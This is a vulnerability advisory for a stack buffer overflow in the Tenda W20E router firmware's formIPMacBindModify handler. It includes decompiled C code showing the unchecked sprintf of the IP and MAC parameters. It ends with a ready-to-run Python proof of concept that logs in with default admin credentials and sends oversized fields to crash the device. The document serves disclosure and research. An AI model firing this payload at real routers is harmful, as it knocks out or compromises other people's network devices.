# Tenda W20E

### version

```
V15.11.0.6 （US_W20EV4.0br_V15.11.0.6（1068_1546_841）_CN_TDC）
```

### Firmware

```
https://www.tenda.com.cn/download/detail-2707.html
```



## modifyIpMacBind

### detail

In function formIPMacBindModify,the content obtained by the program from the parameter "IPMacBindRuleIp" and"IPMacBindRuleMac" are passed to ip and mac.Then the ip and mac are directly copied into the tmp stack through the sprintf function.There is no size check, so there is a stack overflow vulnerability.The attacker can easily perform a Deny of Service Attack or Remote Code Execution with carefully crafted overflow data.

```c
void __cdecl formIPMacBindModify(webs_t wp, unsigned __int8 *path, unsigned __int8 *query)
{
  int v3; // r0
  int v4; // r0
  int v5; // r0
  int v6; // r0
  int v7; // r0
  unsigned __int8 mibName[128]; // [sp+24h] [bp-618h] BYREF
  unsigned __int8 ruleId[128]; // [sp+A4h] [bp-598h] BYREF
  unsigned __int8 msg[512]; // [sp+124h] [bp-518h] BYREF
  unsigned __int8 tmp[512]; // [sp+324h] [bp-318h] BYREF
  unsigned __int8 slctLst[128]; // [sp+524h] [bp-118h] BYREF
  unsigned __int8 out[128]; // [sp+5A4h] [bp-98h] BYREF
  int index; // [sp+624h] [bp-18h]
  unsigned __int8 *remark; // [sp+628h] [bp-14h]
  unsigned __int8 *mac; // [sp+62Ch] [bp-10h]
  unsigned __int8 *ip; // [sp+630h] [bp-Ch]
  unsigned __int8 *ruleIndex; // [sp+634h] [bp-8h]

  *(_DWORD *)out = 49;
  memset(&out[4], 0, 0x7Cu);
  *(_DWORD *)slctLst = 0;
  memset(&slctLst[4], 0, 0x7Cu);
  *(_DWORD *)tmp = 0;
  memset(&tmp[4], 0, 0x1FCu);
  *(_DWORD *)msg = 0;
  memset(&msg[4], 0, 0x1FCu);
  ruleIndex = 0;
  ip = 0;
  mac = 0;
  remark = 0;
  ruleIndex = websGetVar(wp, "IPMacBindRuleId", "0");
  ip = websGetVar(wp, "IPMacBindRuleIp", "000:000:000:000");
  mac = websGetVar(wp, "IPMacBindRuleMac", "00:00:00:00:00:00");
  remark = websGetVar(wp, "IPMacBindRuleRemark", "hello");
  index = 0;
  *(_DWORD *)ruleId = 0;
  memset(&ruleId[4], 0, 0x7Cu);
  *(_DWORD *)mibName = 0;
  memset(&mibName[4], 0, 0x7Cu);
  v3 = atoi((const char *)ruleIndex);
  sprintf((char *)mibName, "security.ipbind.list%d", v3 + 1);
  GetValue((int)mibName, (int)slctLst);
  getKeyfrmLst(slctLst, ";", 0, ruleId);
  v4 = atoi((const char *)ruleIndex);
  listRm(IPMAC_BIND, v4 + 1);
  v5 = atoi((const char *)ruleId);
  sprintf(
    (char *)tmp,
    "%s;1;%s;%s;name%d;%s",
    (const char *)ruleId,
    (const char *)ip,
    (const char *)mac,
    v5,
    (const char *)remark);
  v6 = atoi((const char *)ruleIndex);
  ipmacBindRuleAdd(tmp, v6 + 1);
  listNumAdd("security.ipbind.list", 1);
  sprintf((char *)msg, "op=%d", 6);
  v7 = send_msg_to_netctrl(11, msg);
  CommitCfm(v7);
  outputToWebs(wp, out);
}
```



### poc

```python
import requests

cmd  = b'IPMacBindRuleId=' + b'9' 
cmd += b'&IPMacBindRuleIp=' + b'A' * 1000
cmd += b'&IPMacBindRuleMac=' + b'B' * 1000
cmd += b'&IPMacBindRuleRemark=' + b'A' * 500
cmd += b'&staticRouteWAN=' + b'A' * 20

url = b"http://192.168.0.1/login/Auth"
payload = b"http://192.168.0.1/goform/modifyIpMacBind/?" + cmd

data = {
    "username": "admin",
    "password": "admin",
}

def attack():
    s = requests.session()
    resp = s.post(url=url, data=data)
    print(resp.content)
    resp = s.post(url=payload, data=data)
    print(resp.content)

attack()
```

